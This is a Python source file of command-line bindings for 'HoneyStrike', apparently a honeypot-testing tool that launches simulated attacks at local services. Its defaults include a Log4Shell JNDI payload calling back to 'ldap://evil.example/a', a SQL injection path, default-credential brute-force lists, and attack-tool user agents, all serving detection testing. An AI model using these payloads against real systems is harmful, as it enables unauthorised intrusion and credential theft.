"""Typer command bindings for the 10 attack scenarios.

Thin wrappers — every scenario delegates to a pure async function in
`runners.py`. That separation keeps the attack engines testable without
typer in the way and lets `campaigns.py` invoke them programmatically.
"""

from __future__ import annotations

from typing import Optional

import typer

from honeystrike.cli.attack import attack_app
from honeystrike.cli.attack import runners
from honeystrike.cli.http_client import run_async
from honeystrike.cli.output import banner, info, success


Intensity = str  # typer renders Literal types poorly; we validate inline.
_INTENSITY = {"slow", "medium", "burst"}


def _validate_intensity(value: str) -> str:
    if value not in _INTENSITY:
        raise typer.BadParameter(f"intensity must be one of {sorted(_INTENSITY)}")
    return value


# ---------------------------------------------------------------------------
# `attack list`
# ---------------------------------------------------------------------------

@attack_app.command("list", help="Enumerate every scenario + campaign with a description.")
def list_scenarios() -> None:
    from rich.table import Table

    from honeystrike.cli.output import console

    t = Table(title="HoneyStrike attack scenarios", header_style="bold cyan")
    t.add_column("Command")
    t.add_column("What it does")
    rows: list[tuple[str, str]] = [
        ("attack ssh-hydra", "Paramiko brute force, Hydra default wordlist"),
        ("attack http-sqlmap", "sqlmap UA + SQLi payload to admin panels"),
        ("attack http-log4shell", "JNDI:LDAP payload (CVE-2021-44228)"),
        ("attack http-traversal", "Path traversal probes"),
        ("attack http-recon", "Fingerprinting GETs to /.env, /.git, /wp-login.php, …"),
        ("attack ftp-hydra", "FTP credential brute force"),
        ("attack rdp-scan", "TPKT+X.224 with mstshash cookie"),
        ("attack tls-fingerprint", "TLS handshake → JA3 capture"),
        ("attack multi-service", "Same IP hits 3+ services in 30s"),
        ("attack full-compromise", "Scripted recon → exploit → access → discovery chain"),
        ("attack campaign apt28", "Adversary-emulation: HTTP recon → sqlmap → SSH brute + shell"),
        ("attack campaign fin7", "sqlmap → traversal → FTP brute"),
        ("attack campaign ransomware-deployer", "RDP scan → SSH brute → HTTP recon"),
        ("attack campaign script-kiddie", "Low-noise random baseline"),
    ]
    for cmd, desc in rows:
        t.add_row(cmd, desc)
    console.print(t)


# ---------------------------------------------------------------------------
# Per-scenario commands. Every one accepts a small parameter surface.
# ---------------------------------------------------------------------------

@attack_app.command("ssh-hydra", help="SSH brute force, Hydra-style.")
def ssh_hydra(
    target: str = typer.Option("127.0.0.1:2222", "--target"),
    username: str = typer.Option("root", "--username"),
    password_list: Optional[str] = typer.Option(None, "--password-list",
                                                help="Newline-delimited file."),
    count: Optional[int] = typer.Option(None, "--count"),
    intensity: str = typer.Option("medium", "--intensity",
                                  callback=_validate_intensity),
    keep_shell: bool = typer.Option(False, "--keep-shell",
                                    help="Run recon commands if granted."),
) -> None:
    banner(f"⚔ ssh-hydra → {target}")
    summary = run_async(runners.ssh_hydra(
        target=target, username=username, password_list_path=password_list,
        count=count, intensity=intensity, keep_shell=keep_shell,
    ))
    success(f"done — {summary.get('attempts', 0)} attempts, granted={summary.get('granted')}")


@attack_app.command("http-sqlmap", help="sqlmap UA + SQLi payload.")
def http_sqlmap(
    target: str = typer.Option("127.0.0.1:18080", "--target"),
    path: str = typer.Option(
        "/wp-admin/index.php?id=1+UNION+SELECT+password+FROM+users", "--path",
    ),
    user_agent: str = typer.Option("sqlmap/1.7.8#stable", "--user-agent"),
    count: int = typer.Option(1, "--count"),
    intensity: str = typer.Option("medium", "--intensity", callback=_validate_intensity),
) -> None:
    banner(f"⚔ http-sqlmap → {target}{path}")
    summary = run_async(runners.http_sqlmap(
        target=target, path=path, user_agent=user_agent,
        count=count, intensity=intensity,
    ))
    success(f"done — {summary.get('requests')} requests")


@attack_app.command("http-log4shell", help="JNDI:LDAP payload (CVE-2021-44228).")
def http_log4shell(
    target: str = typer.Option("127.0.0.1:18080", "--target"),
    path: str = typer.Option("/api/v1/health", "--path"),
    callback: str = typer.Option("ldap://evil.example/a", "--callback"),
    count: int = typer.Option(1, "--count"),
) -> None:
    banner(f"⚔ http-log4shell → {target}{path}")
    summary = run_async(runners.http_log4shell(
        target=target, path=path, callback=callback, count=count,
    ))
    success(f"done — {summary.get('requests')} request(s)")


@attack_app.command("http-traversal", help="Path-traversal probes.")
def http_traversal(
    target: str = typer.Option("127.0.0.1:18080", "--target"),
    depth: int = typer.Option(5, "--depth"),
    encoding: str = typer.Option("plain", "--encoding",
                                  help="plain | url | double-url"),
) -> None:
    banner(f"⚔ http-traversal → {target}")
    summary = run_async(runners.http_traversal(
        target=target, depth=depth, encoding=encoding,
    ))
    success(f"done — {summary.get('requests')} probes")


@attack_app.command("http-recon", help="Fingerprinting GETs (and CTF canary capture).")
def http_recon(
    target: str = typer.Option("127.0.0.1:18080", "--target"),
    paths: Optional[str] = typer.Option(None, "--paths",
                                        help="Comma-separated; default = built-in 12 paths."),
    user_agent: str = typer.Option("Nikto/2.5.0", "--user-agent"),
) -> None:
    banner(f"⚔ http-recon → {target}")
    summary = run_async(runners.http_recon(
        target=target,
        paths=paths.split(",") if paths else None,
        user_agent=user_agent,
    ))
    info(f"requests:  {summary.get('requests')}")
    info(f"canaries:  {summary.get('canaries_seen', 0)}")
    success("done")


@attack_app.command("ftp-hydra", help="FTP brute force.")
def ftp_hydra(
    target: str = typer.Option("127.0.0.1:2221", "--target"),
    credentials: str = typer.Option(
        "root:toor,admin:admin,root:root,oracle:oracle", "--credentials",
    ),
    intensity: str = typer.Option("medium", "--intensity", callback=_validate_intensity),
) -> None:
    banner(f"⚔ ftp-hydra → {target}")
    summary = run_async(runners.ftp_hydra(
        target=target, credentials=credentials, intensity=intensity,
    ))
    success(f"done — {summary.get('attempts')} attempts across {summary.get('sessions')} sessions")


@attack_app.command("rdp-scan", help="TPKT+X.224 connection request with mstshash cookie.")
def rdp_scan(
    target: str = typer.Option("127.0.0.1:33389", "--target"),
    cookie: str = typer.Option("mstshash=PenTest", "--cookie"),
    protocols: int = typer.Option(1, "--protocols"),
) -> None:
    banner(f"⚔ rdp-scan → {target}")
    summary = run_async(runners.rdp_scan(
        target=target, cookie=cookie, protocols=protocols,
    ))
    success(f"done — bytes_received={summary.get('bytes_received')}")


@attack_app.command("tls-fingerprint", help="TLS handshake → JA3 capture.")
def tls_fingerprint(
    target: str = typer.Option("127.0.0.1:8443", "--target"),
    sni: str = typer.Option("localhost", "--sni"),
    cipher_mode: str = typer.Option("default", "--cipher-mode",
                                    help="default | modern | legacy"),
) -> None:
    banner(f"⚔ tls-fingerprint → {target}")
    summary = run_async(runners.tls_fingerprint(
        target=target, sni=sni, cipher_mode=cipher_mode,
    ))
    success("done — JA3 should now be visible on the corresponding session's fingerprint")


@attack_app.command("multi-service", help="Same IP hits 3+ services in 30s.")
def multi_service(
    target_host: str = typer.Option("127.0.0.1", "--target-host"),
    services: str = typer.Option("ssh,http,ftp,rdp,tls", "--services"),
    intensity: str = typer.Option("medium", "--intensity", callback=_validate_intensity),
) -> None:
    banner(f"⚔ multi-service → {target_host} ({services})")
    summary = run_async(runners.multi_service(
        target_host=target_host,
        services=[s.strip() for s in services.split(",")],
        intensity=intensity,
    ))
    success(f"done — hit {summary.get('services_hit')} services")


@attack_app.command("full-compromise", help="Scripted intrusion chain.")
def full_compromise(
    target_host: str = typer.Option("127.0.0.1", "--target-host"),
    dwell_seconds: float = typer.Option(2.0, "--dwell-seconds"),
    report: bool = typer.Option(False, "--report",
                                help="Print narrative for the top-scored session."),
) -> None:
    banner(f"⚔ full-compromise → {target_host}")
    summary = run_async(runners.full_compromise(
        target_host=target_host, dwell_seconds=dwell_seconds, with_report=report,
    ))
    success(f"done — {summary.get('phases')} phases completed")
